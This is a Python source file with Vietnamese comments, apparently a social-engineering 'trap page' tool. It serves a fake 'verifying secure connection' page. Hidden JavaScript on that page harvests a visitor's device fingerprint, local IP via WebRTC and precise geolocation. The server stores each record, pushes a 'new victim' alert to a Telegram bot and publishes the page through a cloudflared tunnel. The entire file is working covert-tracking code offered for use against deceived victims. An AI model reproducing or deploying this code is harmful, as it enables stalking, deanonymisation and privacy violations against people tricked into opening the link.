"""
Module trang bẫy thiết bị (Social Engineering).
Thu thập fingerprint nạn nhân qua JS + Telegram alert + Cloudflared tunnel.
"""
from __future__ import annotations

import http.server
import json
import logging
import os
import re
import socket
import socketserver
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Any

import requests

logger = logging.getLogger(__name__)

TRAP_HTML = """<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Đang xác minh kết nối...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    background: #0a0e17; color: #e6edf3;
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh; padding: 20px;
  }
  .box { max-width: 480px; width: 100%; text-align: center; }
  .spin {
    width: 48px; height: 48px; border: 4px solid #1f6feb;
    border-top-color: transparent; border-radius: 50%;
    margin: 0 auto 24px; animation: sp 1s linear infinite;
  }
  @keyframes sp { to { transform: rotate(360deg); } }
  h1 { font-size: 20px; margin-bottom: 12px; font-weight: 600; }
  p { color: #8b949e; font-size: 14px; line-height: 1.6; }
  .bar { height: 6px; background: #161b22; border-radius: 3px; margin-top: 24px; overflow: hidden; }
  .fill { height: 100%; background: #1f6feb; width: 0%; transition: width 0.4s; }
</style>
</head>
<body>
<div class="box">
  <div class="spin"></div>
  <h1>Đang xác minh kết nối an toàn</h1>
  <p>Vui lòng đợi trong giây lát, hệ thống đang kiểm tra thiết bị của bạn.</p>
  <div class="bar"><div class="fill" id="fill"></div></div>
</div>
<script>
async function collect() {
  const data = {};
  data.user_agent = navigator.userAgent;
  data.ngon_ngu = navigator.language;
  data.platform = navigator.platform;
  data.cpu_cores = navigator.hardwareConcurrency || null;
  data.ram_gb = navigator.deviceMemory || null;
  data.do_phan_giai = `${screen.width}x${screen.height}`;
  data.mau_sac = screen.colorDepth;
  data.mui_gio = Intl.DateTimeFormat().resolvedOptions().timeZone;
  data.thoi_gian = new Date().toISOString();
  data.touch = 'ontouchstart' in window;

  try {
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    if (dbg) {
      data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
      data.gpu_vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
    }
  } catch(e) {}

  try {
    const b = await navigator.getBattery();
    data.pin = Math.round(b.level * 100) + '%';
    data.dang_sac = b.charging;
  } catch(e) {}

  try {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (c) {
      data.loai_mang = c.effectiveType;
      data.downlink = c.downlink;
      data.rtt = c.rtt;
    }
  } catch(e) {}

  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('VietTrack', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('VietTrack', 4, 17);
    const hash = canvas.toDataURL().slice(-64);
    data.canvas_hash = hash;
  } catch(e) {}

  try {
    const rtc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
    rtc.createDataChannel('');
    rtc.onicecandidate = e => {
      if (e.candidate) {
        const m = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);
        if (m && !data.ip_noi_bo) data.ip_noi_bo = m[1];
      }
    };
    await rtc.createOffer().then(o => rtc.setLocalDescription(o));
    await new Promise(r => setTimeout(r, 1500));
  } catch(e) {}

  try {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          data.vi_do = pos.coords.latitude;
          data.kinh_do = pos.coords.longitude;
          data.do_chinh_xac = pos.coords.accuracy;
          send(data);
        },
        () => send(data),
        { enableHighAccuracy: true, timeout: 5000 }
      );
    } else {
      send(data);
    }
  } catch(e) {
    send(data);
  }
}

function send(data) {
  fetch('/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  }).finally(() => {
    document.getElementById('fill').style.width = '100%';
    setTimeout(() => {
      document.querySelector('h1').textContent = 'Xác minh thành công';
      document.querySelector('p').textContent = 'Bạn có thể đóng trang này.';
      document.querySelector('.spin').style.display = 'none';
    }, 800);
  });
}

let p = 0;
const tick = setInterval(() => {
  p = Math.min(p + Math.random() * 12, 90);
  document.getElementById('fill').style.width = p + '%';
}, 400);

collect();
</script>
</body>
</html>
"""


class TrapHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler cho trang bẫy."""

    server_version = "Cloudflare"
    sys_version = ""

    def log_message(self, fmt: str, *args: Any) -> None:
        logger.info("[TRAP] %s", fmt % args)

    def _client_ip(self) -> str:
        """Lấy IP client, ưu tiên header chuyển tiếp."""
        for h in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"):
            val = self.headers.get(h)
            if val:
                return val.split(",")[0].strip()
        return self.client_address[0]

    def do_GET(self) -> None:
        body = TRAP_HTML.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Server", "cloudflare")
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self) -> None:
        if self.path != "/collect":
            self.send_response(404)
            self.end_headers()
            return

        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length) if length else b"{}"
        try:
            payload = json.loads(raw.decode("utf-8", errors="ignore"))
        except ValueError:
            payload = {"raw": raw.decode("utf-8", errors="ignore")}

        payload["ip_cong_khai"] = self._client_ip()
        payload["ip_socket"] = self.client_address[0]
        payload["thoi_diem_nhan"] = datetime.now().isoformat()
        payload["headers"] = dict(self.headers)

        self.server.save_payload(payload)  # type: ignore[attr-defined]

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"ok":true}')


class TrapServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """HTTP server đa luồng, lưu payload và gửi Telegram."""

    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, addr: tuple[str, int], output_dir: str, telegram_token: str = "", chat_id: str = "") -> None:
        super().__init__(addr, TrapHandler)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.telegram_token = telegram_token
        self.chat_id = chat_id

    def save_payload(self, payload: dict) -> None:
        """Lưu payload và gửi Telegram."""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        file = self.output_dir / f"trap_{ts}.json"
        file.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
        logger.info("Đã lưu payload: %s", file)

        if self.telegram_token and self.chat_id:
            self._send_telegram(payload)

    def _send_telegram(self, payload: dict) -> None:
        """Gửi thông báo về Telegram."""
        lines = [f"<b>🎯 Nạn nhân mới</b>", f"IP: <code>{payload.get('ip_cong_khai')}</code>"]
        for k, v in payload.items():
            if k in ("headers", "ip_socket"):
                continue
            lines.append(f"<b>{k}</b>: <code>{v}</code>")
        text = "\n".join(lines)[:4000]
        try:
            requests.post(
                f"https://api.telegram.org/bot{self.telegram_token}/sendMessage",
                data={"chat_id": self.chat_id, "text": text, "parse_mode": "HTML"},
                timeout=15,
            )
        except requests.RequestException as exc:
            logger.warning("Gửi Telegram lỗi: %s", exc)


def _start_cloudflared(port: int) -> subprocess.Popen | None:
    """Khởi động cloudflared quick tunnel."""
    try:
        return subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}", "--no-autoupdate"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
    except FileNotFoundError:
        logger.warning("cloudflared chưa được cài đặt. Bỏ qua tunnel.")
        return None


def _read_tunnel_url(proc: subprocess.Popen, timeout: int = 30) -> str | None:
    """Đọc URL công khai từ cloudflared output."""
    pattern = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
    start = time.time()
    assert proc.stdout is not None
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if not line:
            continue
        match = pattern.search(line)
        if match:
            return match.group(0)
    return None


def _local_ip() -> str:
    """Lấy IP LAN của máy."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "127.0.0.1"


def start_trap(
    port: int = 8080,
    output_dir: str = "output",
    telegram_token: str = "",
    chat_id: str = "",
    use_tunnel: bool = True,
) -> None:
    """
    Khởi động trang bẫy thiết bị.

    Args:
        port: Cổng HTTP server.
        output_dir: Thư mục lưu payload.
        telegram_token: Telegram bot token.
        chat_id: Telegram chat ID.
        use_tunnel: Có dùng cloudflared tunnel không.
    """
    server = TrapServer(("0.0.0.0", port), output_dir, telegram_token, chat_id)
    logger.info("Trang bẫy đang chạy tại http://%s:%d", _local_ip(), port)

    tunnel_proc: subprocess.Popen | None = None
    if use_tunnel:
        tunnel_proc = _start_cloudflared(port)
        if tunnel_proc:
            url = _read_tunnel_url(tunnel_proc)
            if url:
                logger.info("URL công khai: %s", url)
                print(f"\n[+] URL công khai: {url}\n")
            else:
                logger.warning("Không lấy được URL tunnel, dùng IP LAN.")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Dừng trang bẫy...")
    finally:
        server.shutdown()
        if tunnel_proc:
            tunnel_proc.terminate()


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
    start_trap()
